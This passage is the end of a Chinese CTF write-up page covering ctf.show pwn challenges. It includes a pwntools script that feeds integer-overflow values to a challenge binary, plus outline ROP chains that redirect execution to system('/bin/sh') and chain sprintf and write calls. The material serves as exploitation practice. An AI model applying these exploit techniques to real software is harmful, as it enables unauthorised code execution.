  <span class="k">return</span> <span class="mf">0L</span><span class="n">L</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span>    <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;pwn2&#39;</span><span class="p">)</span>
    <span class="c1">#p = remote(&#39;pwn.challenge.ctf.show&#39;,28191)</span>
    	
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;a:&quot;</span><span class="p">,</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;b:&quot;</span><span class="p">,</span><span class="s1">&#39;4294967299&#39;</span><span class="p">)</span>
    	
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;a:&quot;</span><span class="p">,</span><span class="s1">&#39;48145&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;b:&quot;</span><span class="p">,</span><span class="s1">&#39;89209&#39;</span><span class="p">)</span>
    	
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;a:&quot;</span><span class="p">,</span><span class="s1">&#39;-2147483648&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;b:&quot;</span><span class="p">,</span><span class="s1">&#39;-1&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
     
</pre></div>
</div>
</section>
<section id="id1">
<h2>签退<a class="headerlink" href="#id1" title="此标题的永久链接"></a></h2>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>Arch:     i386-32-little
NX:       NX enabled
</pre></div>
</div>
<ul class="simple">
<li><p>aaaaaaaa</p></li>
<li><p>return addr of gets = system</p></li>
<li><p>xxx</p></li>
<li><p>addr of binsh</p></li>
</ul>
<p>https://blog.csdn.net/m0_46483584/article/details/110259127[全部题解]</p>
<p>sprintf(v5,”%s\n”,s)  write(1,v5,9uLL)</p>
<ul class="simple">
<li><p>40+4 A</p></li>
<li><p>&amp;sprintf&#64;plt</p></li>
<li><p>pop3ret</p></li>
<li><p>&amp;v5</p></li>
<li><p>“”</p></li>
<li><p>s</p></li>
<li><p>&amp;write&#64;plt</p></li>
<li><p>1</p></li>
<li><p>v5</p></li>
<li><p>9uLL</p></li>
</ul>
</section>
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
        <a href="test2.html" class="btn btn-neutral float-left" title="ONE hello" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> 上一页</a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>&#169; 版权所有 2022, eclaircy&#39;.</p>
  </div>

  利用 <a href="https://www.sphinx-doc.org/">Sphinx</a> 构建，使用了 
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">主题</a>
    由 <a href="https://readthedocs.org">Read the Docs</a>开发.
   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>